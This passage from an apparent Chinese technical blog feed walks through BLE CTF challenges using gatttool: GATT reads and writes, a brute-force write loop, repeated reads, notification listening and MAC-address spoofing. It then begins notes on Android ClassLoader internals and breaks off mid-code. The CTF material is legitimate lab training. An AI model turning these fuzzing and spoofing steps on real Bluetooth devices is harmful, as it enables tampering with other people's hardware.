title="0x4"></a>0x4</h2><p>Learn about discoverable device attributes</p><blockquote><p>Bluetooth GATT services provide some extra device attributes. Try finding the value of the Generic Access -&gt; Device Name.</p></blockquote><p>查看Generic Access 的Device Name</p><p>首先查看主要服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$gatttool</span> -b 14:2B:2F:C5:8A:56 --primary</span><br><span class="line">attr handle = 0x0001, end grp handle = 0x0005 uuid: 00001801-0000-1000-8000-00805f9b34fb</span><br><span class="line">attr handle = 0x0014, end grp handle = 0x001c uuid: 00001800-0000-1000-8000-00805f9b34fb</span><br><span class="line">attr handle = 0x0028, end grp handle = 0xffff uuid: 000000ff-0000-1000-8000-00805f9b34fb</span><br></pre></td></tr></table></figure><p>蓝牙标准规定的某些特殊服务或者特性存在着固定的UUID</p><p><code>00001800-0000-1000-8000-00805f9b34fb</code>就是Generic Access的固定UUID, 这个服务包含的特性是0x14 到 0x1c 范围</p><p>那么对该范围进行扫描</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$gatttool</span> -b 14:2B:2F:C5:8A:56 --characteristics  --start=0x0014 --end=0x001c</span><br><span class="line">handle = 0x0015, char properties = 0x02, char value handle = 0x0016, uuid = 00002a00-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle = 0x0017, char properties = 0x02, char value handle = 0x0018, uuid = 00002a01-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle = 0x0019, char properties = 0x02, char value handle = 0x001a, uuid = 00002aa6-0000-1000-8000-00805f9b34fb</span><br></pre></td></tr></table></figure><p>其中短uuid 2A00就是Device Name(这也是固定的)</p><p>也就是handle 0x0015, 但0x0015只是特征值声明, 我们需要读取其特征值数据handle也就是0x0016</p><p>读取到后取结果20位即可</p><h2 id="0x5"><a href="#0x5" class="headerlink" title="0x5"></a>0x5</h2><p>Learn about reading and writing to handles</p><blockquote><p>Read handle 0032 and do what it says. Notice that its not telling you to write to the flag handle as you have been. When you find the flag, go ahead and write it to the flag handle you have used in the past flags.</p></blockquote><p>让我们先读0032得到结果是<code>Write anything here</code></p><p>那我们随便写一点东西</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$gatttool</span> -b 14:2B:2F:C5:8A:56 --char-write-req -a 0x0032 -n $(<span class="built_in">echo</span> -n <span class="string">&quot;2b00042f7481c7b056c4&quot;</span>|xxd -ps)</span><br><span class="line"></span><br><span class="line"><span class="variable">$gatttool</span> -b 14:2B:2F:C5:8A:56 --char-read -a 0x0032</span><br><span class="line">Characteristic value/descriptor: 33 38 37 33 63 30 32 37 30 37 36 33 35 36 38 63 66 37 61 61</span><br></pre></td></tr></table></figure><p>写完以后再次读取就变成了flag</p><h2 id="0x6"><a href="#0x6" class="headerlink" title="0x6"></a>0x6</h2><p>Learn about reading and writing ascii to handles</p><blockquote><p>Follow the instructions found from reading handle 0x0034. Keep in mind that some tools only write hex values while other provide methods for writing either hex or ascii</p></blockquote><p>先读0x0034得到字符串<code>Write the ascii value &quot;yo&quot; here</code></p><p>直接写就可以了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 14:2B:2F:C5:8A:56 --char-write-req -a 0x0034 -n $(<span class="built_in">echo</span> -n <span class="string">&quot;yo&quot;</span>|xxd -ps)</span><br></pre></td></tr></table></figure><p>写完后再读变为flag</p><h2 id="0x7"><a href="#0x7" class="headerlink" title="0x7"></a>0x7</h2><p>Learn about reading and writing hex to handles</p><blockquote><p>Follow the instructions found from reading handle 0x0036. Keep in mind that some tools only write hex values while other provide methods for writing either hex or ascii</p></blockquote><p>读取0x0036得到<code>Write the hex value 0x07 here</code></p><p>直接写</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 14:2B:2F:C5:8A:56 --char-write-req -a 0x0036 -n 07</span><br></pre></td></tr></table></figure><h2 id="0x8"><a href="#0x8" class="headerlink" title="0x8"></a>0x8</h2><p>Learn about reading and writing to handles differently</p><blockquote><p>Follow the instructions found from reading handle 0x0038. Pay attention to handles here. Keep in mind handles can be refrenced by integer or hex. Most tools such as gatttool and bleah allow you to specify handles both ways.</p></blockquote><p>读取0x0038得到<code>Write 0xC9 to handle 58</code></p><p>还是直接写</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 14:2B:2F:C5:8A:56 --char-write-req -a 58 -n c9</span><br></pre></td></tr></table></figure><h2 id="0x9"><a href="#0x9" class="headerlink" title="0x9"></a>0x9</h2><p>Learn about write fuzzing</p><blockquote><p>Take a look at handle 0x003c and do what it says. You should script up a solution for this one. Also keep in mind that some tools write faster than others.</p></blockquote><p>读取0x003c得到<code>Brute force my value 00 to ff</code></p><p>即暴力破解一个8比特位的数到0x003c</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 蓝牙设备MAC地址</span></span><br><span class="line">DEVICE=<span class="string">&quot;14:2B:2F:C5:8A:56&quot;</span></span><br><span class="line"><span class="comment"># 特征值句柄</span></span><br><span class="line">HANDLE=<span class="string">&quot;0x3c&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用POSIX兼容的循环语法</span></span><br><span class="line">i=0</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$i</span> -le 255 ]; <span class="keyword">do</span></span><br><span class="line">    <span class="comment"># 将十进制转换为两位十六进制</span></span><br><span class="line">    hex_value=$(<span class="built_in">printf</span> <span class="string">&quot;%02x&quot;</span> <span class="variable">$i</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;正在发送: <span class="variable">$hex_value</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 执行gatttool命令</span></span><br><span class="line">    gatttool -b <span class="variable">$DEVICE</span> --char-write-req -a <span class="variable">$HANDLE</span> -n <span class="variable">$hex_value</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 可选：添加延迟</span></span><br><span class="line">    <span class="built_in">sleep</span> 0.1</span><br><span class="line">    </span><br><span class="line">    i=$((i+<span class="number">1</span>))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;所有单字节值(0x00-0xFF)已发送完毕&quot;</span></span><br></pre></td></tr></table></figure><p>执行后再次读取即可</p><h2 id="0xa"><a href="#0xa" class="headerlink" title="0xa"></a>0xa</h2><p>Learn about read and write speeds</p><blockquote><p>Talke a look at handle 0x003e and do what it says. Keep in mind that some tools have better connection speeds than other for doing reads and writes. This has to do with the functionality the tool provides or how it uses cached BT connections on the host OS. Try testing different tools for this flag. Once you find the fastest one, whip up a script or bash 1 liner to complete the task. FYI, once running, this task takes roughly 90 seconds to complete if done right.</p></blockquote><p>读取0x003e得到<code>Read me 1000 times</code></p><p>读取1000次即可</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">DEVICE=<span class="string">&quot;14:2B:2F:C5:8A:56&quot;</span></span><br><span class="line">HANDLE=<span class="string">&quot;0x003e&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 1000); <span class="keyword">do</span></span><br><span class="line">    gatttool -b <span class="variable">$DEVICE</span> --char-read -a <span class="variable">$HANDLE</span></span><br><span class="line">    <span class="built_in">sleep</span> 0.01</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>最后就可以读出flag</p><h2 id="0xb"><a href="#0xb" class="headerlink" title="0xb"></a>0xb</h2><p>Learn about single response notifications</p><blockquote><p>Check out handle 0x0040 and google search gatt notify. Some tools like gatttool have the ability to subscribe to gatt notifications</p></blockquote><p>读取得到<code>Listen to me for a single notification</code></p><p>客户端可以向服务端请求通知一项特征值，当该特征可用时服务端会通知客户端，通知（notification）不需要客户端回应 ACK</p><p>使用命令发起请求监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 14:2B:2F:C5:8A:56 --char-write-req -a 0x0040 -n 00 --listen</span><br></pre></td></tr></table></figure><p>00可以是任意值没什么要求</p><h2 id="0xc"><a href="#0xc" class="headerlink" title="0xc"></a>0xc</h2><p>Learn about single response indicate</p><blockquote><p>Check out handle 0x0042 and google search gatt indicate. For single response indicate messages, like this challenge, tools such as gatttool will work just fine.</p></blockquote><p>读取得到<code>Listen to handle 0x0044 for a single indication</code></p><p>指示与通知差不多但区别在于指示需要我们回应</p><p>单指令其实和上一题没有区别</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 14:2B:2F:C5:8A:56 --char-write-req -a 0x0044 -n 11 --listen</span><br></pre></td></tr></table></figure><h2 id="0xd"><a href="#0xd" class="headerlink" title="0xd"></a>0xd</h2><p>Learn about multi response notifications</p><blockquote><p>Check out handle 0x0046 and do what it says. Keep in mind that this notification clallange requires you to recieve multiple responses in order to complete.</p></blockquote><p>读取得到<code>Listen to me for multi notifications</code></p><p>还是和上一题一样的的指令, 不过要多等一下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 14:2B:2F:C5:8A:56 --char-write-req -a 0x0046 -n 11 --listen</span><br></pre></td></tr></table></figure><h2 id="0xe"><a href="#0xe" class="headerlink" title="0xe"></a>0xe</h2><p>Learn about multi response indicate</p><blockquote><p>Check out handle 0x0048 and google search gatt indicate. Keep in mind that this chalange will require you to parse multiple indicate responses in order to complete the chalange.</p></blockquote><p>读取得到<code>Listen to handle 0x004a for multi indications</code></p><p>还是一样的命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 14:2B:2F:C5:8A:56 --char-write-req -a 0x004a -n 11 --listen</span><br></pre></td></tr></table></figure><h2 id="0xf"><a href="#0xf" class="headerlink" title="0xf"></a>0xf</h2><p>Learn about BT client device attributes</p><blockquote><p>Check out handle 0x004c and do what it says. Much like ethernet or wifi devices, you can also change your bluetooth devices mac address.</p></blockquote><p>读取得到<code>Connect with BT MAC address 11:22:33:44:55:66</code></p><p>也就是要修改设备的MAC地址</p><p>可以使用工具<a href="https://github.com/thxomas/bdaddr">thxomas/bdaddr: Updated version of the bluez bdaddr tool</a></p><h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><p>Learn about message sizes MTU</p><blockquote><p>Read handle 0x004e and do what it says. Setting MTU can be a tricky thing. Some tools may provide mtu flags, but they dont seem to really trigger MTU negotiations on servers. Try using gatttool’s interactive mode for this task. By default, the BLECTF server is set to force an MTU size of 20. The server will listen for MTU negotiations, and look at them, but we dont really change the MTU in the code. We just trigger the flag code if you trigger an MTU event with the value specified in handle 0x004e. GLHF!</p></blockquote><p>读取得到<code>Set your connection MTU to 444</code></p><p>MTU是蓝牙单次数据传输能承载的最大字节数</p><p>可以直接通过命令行参数设置, 不过存在一些问题, 得使用交互模式</p><h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><p>Learn about write responses</p><blockquote><p>Check out handle 0x0050 and do what it says. This chalange differs from other write chalanges as your tool that does the write needs to have write response ack messages implemente correctly. This flag is also tricky as the flag will come back as notification response data even though there is no “NOTIFY” property.</p></blockquote><p>读取得到<code>Write+resp &#39;hello&#39;</code></p><p>对于<code>--char-write</code>和<code>--char-write-req</code>差别就在于后者必须接受到目标的回复, 有更高的可靠性</p><p>所以这里直接写就可以了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 14:2B:2F:C5:8A:56 --char-write-req -a 0x0050 -n $(<span class="built_in">echo</span> -n <span class="string">&quot;hello&quot;</span>|xxd -ps)</span><br></pre></td></tr></table></figure><h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><p>Hidden notify property</p><blockquote><p>Take a look at handle 0x0052. Notice it does not have a notify property. Do a write here and listen for notifications anyways! Things are not always what they seem!</p></blockquote><p>读取得到<code>No notifications here! really?</code></p><p>根据特征属性标志位</p><ul><li>0x01：允许广播</li><li>0x02：允许读取</li><li>0x04：允许写入（无响应）</li><li>0x08：允许写入（带响应）</li><li>0x10：允许通知（无确认）</li><li>0x20：允许通知（带确认）</li><li>0x40：允许经过身份签名的写入</li><li>0x80：运行扩展属性</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handle = 0x0051, char properties = 0x0a, char value handle = 0x0052, uuid = 0000ff15-0000-1000-8000-00805f9b34fb</span><br></pre></td></tr></table></figure><p>0x0a属性本不应该有通知权限, 但因为源码虽然仍然使用了esp_ble_gatts_send_indicate发送通知, 所以依然可以接收到通知</p><h2 id="0x13"><a href="#0x13" class="headerlink" title="0x13"></a>0x13</h2><p>Use multiple handle properties</p><blockquote><p>Check out all of the handle properties on 0x0054! Poke around with all of them and find pieces to your flag.</p></blockquote><p>读取得到<code>So many properties!</code></p><p>我们可以看到该句柄具有很多权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handle = 0x0053, char properties = 0x9b, char value handle = 0x0054, uuid = 0000ff16-0000-1000-8000-00805f9b34fb</span><br></pre></td></tr></table></figure><p>可以写入也可以监听, 所以只需要写入一次读取再监听一次</p><p>即可得到完整的flag</p><h2 id="0x14"><a href="#0x14" class="headerlink" title="0x14"></a>0x14</h2><p>md5 of author’s twitter handle</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;通过blectf简单认识与ble的交互&lt;/p&gt;
&lt;h1 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;通用属性配置文件（GATT）&lt;/strong&gt; 是 B</summary>
      
    
    
    
    <category term="ble" scheme="https://ixout.github.io/categories/ble/"/>
    
    
  </entry>
  
  <entry>
    <title>Android ClassLoader 学习笔记</title>
    <link href="https://ixout.github.io/posts/38747/"/>
    <id>https://ixout.github.io/posts/38747/</id>
    <published>2024-11-07T03:24:20.000Z</published>
    <updated>2025-03-12T03:21:10.754Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本类预加载"><a href="#基本类预加载" class="headerlink" title="基本类预加载"></a>基本类预加载</h1><p>从linux系统启动到进入android世界之前, 简要流程就是</p><ul><li><strong>Bootloader</strong> 加载内核，初始化 CPU、内存，挂载文件系统</li><li><strong>Linux 内核</strong> 启动，初始化设备驱动、挂载 <code>rootfs</code>，启动 <code>init</code> 进程</li><li><strong><code>init</code> 进程</strong> 解析 <code>/init.rc</code>，启动关键服务（如 <code>ueventd</code>、<code>vold</code>），然后启动 <code>Zygote</code></li><li><strong>Zygote 进程</strong> 运行 <code>ZygoteInit.main()</code>，预加载 Java 类，并 <code>fork()</code> 启动 <code>SystemServer</code></li></ul><p>Zygote 是 <strong>Android 进程的孵化器</strong>，几乎所有的应用进程都是由它 fork 出来的。</p><p>zygote在native时做的工作(/system/bin/app_process)</p><blockquote><p>（1）创建虚拟机–startVM<br>（2）注册JNI函数–startReg<br>（3）通过JNI获得Java层的com.android.internal.os.ZygoteInit 类，调用main 函数，进入java 世界</p></blockquote><p>zygote在java时做的工作</p><blockquote><p>（4）registerZygoteSocket()建立socket通道，zygote作为通信的服务端，用于响应客户端请求<br>（5）preload()预加载通用类、drawable和color资源、openGL以及共享库以及WebView，用于提高app启动效率<br>（6）通过startSystemServer()，fork得力帮手system_server进程，也是Java Framework的运行载体（下面讲到system server再详细讲解）<br>（7）调用runSelectLoop()，随时待命，当接收到请求创建新进程请求时立即唤醒并执行相应工作</p></blockquote><p>preload加载基本类部分代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">preload</span><span class="params">(TimingsTraceLog bootTimingsTraceLog)</span> &#123;</span><br><span class="line">    <span class="comment">// ...省略</span></span><br><span class="line">    preloadClasses();</span><br><span class="line">    <span class="comment">// ...省略</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">preloadClasses</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">VMRuntime</span> <span class="variable">runtime</span> <span class="operator">=</span> VMRuntime.getRuntime();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取 preloaded_classes 文件</span></span><br><span class="line">    InputStream is;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        is = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(PRELOADED_CLASSES);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">&quot;Couldn&#x27;t find &quot;</span> + PRELOADED_CLASSES + <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...省略</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is), Zygote.SOCKET_BUFFER_SIZE);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// Skip comments and blank lines.</span></span><br><span class="line">            line = line.trim();</span><br><span class="line">            <span class="keyword">if</span> (line.startsWith(<span class="string">&quot;#&quot;</span>) || line.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Trace.traceBegin(Trace.TRACE_TAG_DALVIK, line);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 逐行加载基本类</span></span><br><span class="line">                Class.forName(line, <span class="literal">true</span>, <span class="literal">null</span>);</span><br><span class="line">                count++;</span><br><span class="line">                <span class="comment">// ...省略</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                <span class="comment">// ...省略</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...省略</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">&quot;Error reading &quot;</span> + PRELOADED_CLASSES + <span class="string">&quot;.&quot;</span>, e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// ...省略</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于预加载, 在dalvik/art启动时将所有Java基本类和Android系统框架的基本类加载进来</p><p>这些类只需要在Zygote进程启动时加载一遍，后续APP或Android运行时环境的进程，都是从Zygote中fork出来，自然会继承zygote加载过的类</p><h1 id="双亲委派"><a href="#双亲委派" class="headerlink" title="双亲委派"></a>双亲委派</h1><p>Android中的类加载器机制与JVM一样遵循双亲委派模式</p><p>所谓双亲委派就是指</p><ol><li>加载.class时以递归的方式逐级向上委托给父加载器ParentClassLoader, 父加载器首先判断是否加载过该class<ol><li>加载过则直接向下返回</li><li>未加载过则继续向上提交</li></ol></li><li>直到提交到顶层父加载器, 如果顶层父加载器也没有加载过, 则尝试加载, 如果加载失败则逐级向下交还调用者加载</li></ol><p>代码如下<code>/libcore/ojluni/src/main/java/java/lang/ClassLoader.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                    c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                <span class="comment">// to find the class.</span></span><br><span class="line">                c = findClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>findLoadedClass</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns the class with the given &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt; if this</span></span><br><span class="line"><span class="comment"> * loader has been recorded by the Java virtual machine as an initiating</span></span><br><span class="line"><span class="comment"> * loader of a class with that &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt;.  Otherwise</span></span><br><span class="line"><span class="comment"> * &lt;tt&gt;null&lt;/tt&gt; is returned.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  name</span></span><br><span class="line"><span class="comment"> *         The &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt; of the class</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  The &lt;tt&gt;Class&lt;/tt&gt; object, or &lt;tt&gt;null&lt;/tt&gt; if the class has</span></span><br><span class="line"><span class="comment"> *          not been loaded</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>  1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; findLoadedClass(String name) &#123;</span><br><span class="line">    ClassLoader loader;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span> == BootClassLoader.getInstance())</span><br><span class="line">        loader = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        loader = <span class="built_in">this</span>;</span><br><span class="line">    <span class="keyword">return</span> VMClassLoader.findLoadedClass(loader, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>VMClassLoader.findLoadedClass(loader, name)</code> 是一个 <strong>native 方法</strong>，直接与 JVM 交互，用于查询 <code>name</code> 这个类是否已经被 <code>loader</code> 加载过。如果已经加载，返回 <code>Class&lt;?&gt;</code> 对象</p><p>如果当前 <code>ClassLoader</code> 是 <code>BootClassLoader</code>，则将 <code>loader</code> 设为 <code>null</code>，表示请求 JVM 内部查找是否加载过该类, 否则在对应的loader内寻找</p><hr><p>如果当前没有找到该类, 则提交给父加载器递归调用<code>LoadClass</code>, 如果顶层父加载器也没找到就调用<code>findClass</code>进行加载类</p><h1 id="android类加载器"><a href="#android类加载器" class="headerlink" title="android类加载器"></a>android类加载器</h1><p>对于android主要关注三个类加载器</p><ul><li><strong>系统类的加载器</strong>（BootClassLoader）</li><li><strong>当前应用的类加载器</strong>（PathClassLoader）</li><li><strong>动态加载一个外部 <code>dex</code> 文件</strong>(DexClassLoader)</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/classloader.png" alt=""></p><p>BootClassLoader是ClassLoader的子类, PathClassLoader 和 DexClassLoader是BaseDexClassLoader的子类, 而BaseDexClassLoader又是ClassLoader的子类</p><p>三者的父加载器关系是<strong>DexClassLoader</strong> → <strong>PathClassLoader</strong> → <strong>BootClassLoader</strong> -&gt; <strong>Null</strong></p><p>而BootClassLoader是全局唯一的</p><p>PathClassLoader实例则是每个APP都拥有一个</p><p><strong>demo</strong></p><p>一个测试程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> 